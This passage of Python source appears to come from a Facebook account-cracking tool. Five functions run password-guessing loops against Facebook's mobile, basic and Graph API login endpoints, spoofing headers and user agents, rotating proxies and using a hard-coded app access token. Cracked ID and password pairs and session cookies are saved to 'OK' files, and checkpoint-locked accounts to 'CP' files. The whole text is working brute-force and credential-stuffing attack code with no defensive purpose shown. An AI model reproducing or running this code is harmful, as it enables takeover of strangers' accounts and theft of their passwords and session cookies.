			head.update({"user-agent": ua});ses.post("https://m.facebook.com"+login.find("form",{"method":"post"}).get("action"),data=data)
			if "checkpoint" in ses.cookies.get_dict():
				print(f"\r *----> {K}{idf}|{pw}|{ua}{P}")
				open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r *----> {H}{idf}|{pw}|{kuki}{P}")
				open('OK/'+sim_ok,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f"\r *----> {P}{loop}{P}/{H}{len(id2)}{P} OK:{H}{ok}{P} CP:{K}{cp}{P}"),
		sys.stdout.flush()
	except (RequestException) as e:
		print(f"{M} Koneksi Error...                            ", end='\r');sleep(7.5);crack1(idf,pwv)

def crack2(idf,pwv):
	global loop,ok,cp
	ua = random.choice(agen)
	ses = requests.Session()
	try:
		for pw in pwv:
			nip=random.choice(prox)
			proxs= {'http': 'http://'+nip}
			link = ses.get("https://mbasic.facebook.com/login/?locale=id_ID&refsrc=deprecated")
			data = {'lsd':re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'m_ts':re.search('"m_ts" value="(.*?)"',str(link.text)).group(1),'li':re.search('"li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email':idf,'pass':pw,'login': 'Masuk','bi_xrwh':re.search('"bi_xrwh" value="(.*?)"',str(link.text)).group(1)}
			params = {'refsrc': 'deprecated','lwv': '100','locale2': 'id_ID'}
			headers = {'authority': 'mbasic.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://mbasic.facebook.com','pragma': 'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace','referer': 'https://mbasic.facebook.com/login/?locale=id_ID&refsrc=deprecated','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"9.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent':ua,'viewport-width': '980'}
			response = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/',params=params,headers=headers,data=data)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r *----> {H}{idf}|{pw}|{kuki}{P}")
				open('OK/'+sim_ok,'a').write(idf+'|'+pw+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				print(f"\r *----> {K}{idf}|{pw}|{ua}{P}")
				open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f"\r *----> {P}{loop}{P}/{H}{len(id2)}{P} OK:{H}{ok}{P} CP:{K}{cp}{P}"),
		sys.stdout.flush()
	except (RequestException) as e:
		print(f"{M} Koneksi Error...                            ", end='\r');sleep(7.5);crack2(idf,pwv)


def crack3(idf,pwv):
	global loop,ok,cp
	ua = random.choice(agen)
	sys.stdout.write(f"\r *----> {P}{loop}{P}/{H}{len(id2)}{P} OK:{H}{ok}{P} CP:{K}{cp}{P}"),
	sys.stdout.flush()
	ses = requests.Session()
	for pw in pwv:
		try:
			link = ses.get("https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1")
			data = {'lsd':re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'m_ts':re.search('"m_ts" value="(.*?)"',str(link.text)).group(1),'li':re.search('"li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email':idf,'pass':pw,'login': 'Masuk','bi_xrwh':re.search('"bi_xrwh" value="(.*?)"',str(link.text)).group(1)}
			params = {'refsrc': 'deprecated','lwv': '100','ref': 'dbl'}
			headers = {'authority': 'mbasic.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','origin': 'https://mbasic.facebook.com','referer': 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"9.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua,'viewport-width': '980'}
			response = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/', params=params,headers=headers, data=data)
			if "c_user" in ses.cookies.get_dict():
				ok+=1
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f"\r *----> {H}{idf}|{pw}{A}|{kuki}{P}")
				open('OK/'+sim_ok,'a').write(idf+'|'+pw+'\n')
				break
			elif "checkpoint" in response.cookies.get_dict():
				print(f"\r *----> {K}{idf}|{pw}{A}|{ua}{P}")
				open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			sleep(31)
	loop+=1

def crack4(idf,pwv):
	global loop,ok,cp
	ses = requests.Session()
	ua = random.choice(ngentott)
	sys.stdout.write(f"\r *----> {P}{loop}{P}/{H}{len(id2)}{P} OK:{H}{ok}{P} CP:{K}{cp}{P}"),
	sys.stdout.flush()
	for pw in pwv:
		pw = pw.lower()
		try:
			head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)), 'x-fb-sim-hni': repr(random.randint(2e4, 4e4)), 'x-fb-net-hni': repr(random.randint(2e4, 4e4)),'x-fb-connection-quality': 'EXCELLENT','user-agent': ua,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
			date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': idf, 'locale': 'id_ID', 'password': pw, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
			xnxx = ses.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False).json()
			if "session_key" in xnxx:
				ok+=1
				print(f"\r *----> {H}{idf}|{pw}{P}")
				open('OK/'+sim_ok,'a').write(idf+'|'+pw+'\n')
				break
			elif "www.facebook.com" in xnxx["error"]["message"]:
				cp+=1
				print(f"\r *----> {K}{idf}|{pw}{P}")
				open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
				break
		except requests.exceptions.ConnectionError:
			sleep(31)
	loop+=1

def crack5(idf,pwv):
	global loop,ok,cp
	ses = requests.Session()
	ua = random.choice(ugen2)
	try:
		for pw in pwv:
			pw = pw.lower()
			params = {
			"access_token": "200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16",
			"sdk_version": {random.randint(1,26)}, 
			"email": idf,
			"locale": "en_US",
			"password": pw,
			"sdk": "android",
			"generate_session_cookies": "1",
			"sig": "4f648f21fb58fcd2aa1c65f35f441ef5"
			}
			headers = {
			"Host": "graph.facebook.com",
			"x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
			"x-fb-sim-hni": str(random.randint(20000, 40000)),
			"x-fb-net-hni": str(random.randint(20000, 40000)),
			"x-fb-connection-quality": "EXCELLENT",
			"user-agent": ua,
			"content-type": "application/x-www-form-urlencoded",
			"x-fb-http-engine": "Liger"
			}
			post = ses.post("https://graph.facebook.com/auth/login",params=params, headers=headers, allow_redirects=False)
			if "session_key" in post.text and "EAA" in post.text:
				ok+=1
				coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
				print(f"\r *----> {H}{idf}|{pw}{A}|{coki}{P}")
				open('OK/'+sim_ok,'a').write(idf+'|'+pw+'\n')
				break
			elif "User must verify their account" in post.text:
				print(f"\r *----> {K}{idf}|{pw}{P}")
				open('CP/'+sim_cp,'a').write(idf+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		loop+=1
		sys.stdout.write(f"\r *----> {P}{loop}{P}/{H}{len(id2)}{P} OK:{H}{ok}{P} CP:{K}{cp}{P}"),
		sys.stdout.flush()
	except (RequestException) as e:
		print(f"{M} Koneksi Error...                            ", end='\r');sleep(7.5);crack5(idf,pwv)
	
Jar()